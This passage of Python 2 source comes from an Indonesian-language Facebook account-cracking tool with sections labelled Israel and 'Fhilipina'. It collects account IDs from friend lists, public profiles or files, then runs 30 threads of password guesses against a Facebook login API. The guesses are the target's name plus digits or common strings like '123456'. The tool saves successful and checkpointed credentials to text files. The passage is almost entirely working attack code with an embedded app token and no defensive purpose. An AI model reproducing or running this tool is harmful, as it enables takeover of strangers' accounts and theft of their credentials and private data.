									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = ('password')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
										oke = open("done/israel.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
											cek = open("done/israel.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = j['first_name'].lower()+'123'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
												oke = open("done/israel.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
													cek = open("done/israel.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = j['first_name'].lower()+'12345'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
														oke = open("done/israel.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
															cek = open("done/israel.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = j['first_name'].lower()+'1234'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																oke = open("done/israel.txt", "a")
																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																	cek = open("done/israel.txt", "a")
																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
																else:
																	bos8 = j['last_name'].lower()+'12345'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	ko = json.load(data)
																	if 'access_token' in ko:
																		print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																		oke = open("done/israel.txt", "a")
																		oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																		oke.close()
																		oks.append(zowe)
																	else:
																		if 'www.facebook.com' in ko['error_msg']:
																			print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																			cek = open("done/israel.txt", "a")
																			cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																			cek.close()
																			cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSelesai ...'
	print"\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSalin hasil crack lalu simpan\033[1;91m : \033[1;97mdone Israel.'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m(\033[1;91mKembali\033[1;97m) ")
	os.system("python2 Crack.py")
	
	
	##### CRACK fhilipina #####
def crack_fhilip():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print " "
	print "\033[1;94m _________   ________.    "
	print "\033[1;94m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
	print "\033[1;94m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
	print "\033[1;91m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
	print "\033[1;91m  \______  /|__|   |___  /"
	print "\033[1;91m         \/            \/ "
	print 50* "\033[1;94m─"
	print "\033[1;94m───────────────────\033[1;97m(\033[1;93mFhilipina\033[1;97m)\033[1;94m────────────────────"
	print 50* "\033[1;94m─"
	print "\033[1;94m(\033[1;97m1\033[1;94m) \033[1;97mCrack Dari Daftar Teman"
	print "\033[1;94m(\033[1;97m2\033[1;94m)\033[1;97m Crack Dari Id Teman/Publik"
	print "\033[1;94m(\033[1;97m3\033[1;94m)\033[1;97m Crack Dari File"
	print "\033[1;94m(\033[1;91m0\033[1;94m) \033[1;97mKembali"
	print 50* "\033[1;94m─"
	pilih_fhilip()

#### PILIH filipina ####
def pilih_fhilip():
	teak = raw_input("\033[1;97m(?) Pilih \033[94m> \033[1;97m ")
	if teak =="":
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_fhilip()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print " "
		print "\033[1;94m _________   ________.    "
		print "\033[1;94m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;94m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;91m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;91m  \______  /|__|   |___  /"
		print "\033[1;91m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("             \033[1;94m>>> \033[1;93mCRACK FHILIPINA \033[1;94m<<<")
		print 50* "\033[1;94m─"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print " "
		print "\033[1;94m _________   ________.    "
		print "\033[1;94m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;94m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;91m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;91m  \______  /|__|   |___  /"
		print "\033[1;91m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("             \033[1;94m>>> \033[1;93mCRACK FHILIPINA \033[1;94m<<<")
		print 50* "\033[1;94m─"
		idt = raw_input("\033[1;97m(\033[1;94m•\033[1;97m) ID Publik \033[1;91m:\033[1;97m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print"\033[1;97m(\033[1;94m•\033[1;97m) Nama Akun \033[1;91m:\033[1;97m "+sp["name"]
		except KeyError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) ID publik Tidak Ada!"
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_fhilip()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print " "
		print "\033[1;94m _________   ________.    "
		print "\033[1;94m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;94m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;91m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;91m  \______  /|__|   |___  /"
		print "\033[1;91m         \/            \/ "
		try:
			print 50* "\033[1;94m─"
			print ("             \033[1;94m>>> \033[1;93mCRACK FHILIPINA \033[1;94m<<<")
			print 50* "\033[1;94m─"
			idlist = raw_input('\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mNama File\033[1;91m :\033[1;97m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada ! '
			raw_input('\n\033[1;97m(\033[1;91mKembali \033[1;97m)')
		except IOError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada !'
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_fhilip()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_fhilip()
	
	print "\033[0;97m(\033[0;94m•\033[0;97m) Total ID\033[1;91m  :\033[1;97m "+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;97m(\033[0;94m•\033[0;97m) Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print "\033[0;97m(\033[0;94m•\033[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\033[0m"
	print "\033[0;97m(\033[0;94m•\033[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\033[0m"
	print 50* "\033[1;94m─"
	
##### MAIN fhilipina #####
	def main(arg):
		global cekpoint,oks
		zowe = arg
		try:
			sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;97m%H\033[1;97m:\033[1;97m%M\033[1;97m:\033[1;97m%S")));sys.stdout.flush()
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
				oke = open("done/fhilip.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
					cek = open("done/fhilip.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
						oke = open("done/fhilip.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
							cek = open("done/fhilip.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
								oke = open("done/fhilip.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
									cek = open("done/fhilip.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = ('123456')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
										oke = open("done/fhilip.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
											cek = open("done/fhilip.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = j['first_name'].lower()+'1234'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
												oke = open("done/fhilip.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
													cek = open("done/fhilip.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = ('123456')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
														oke = open("done/fhilip.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
															cek = open("done/fhilip.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = j['first_name'].lower()+'123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																oke = open("done/fhilip.txt", "a")
																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																	cek = open("done/fhilip.txt", "a")
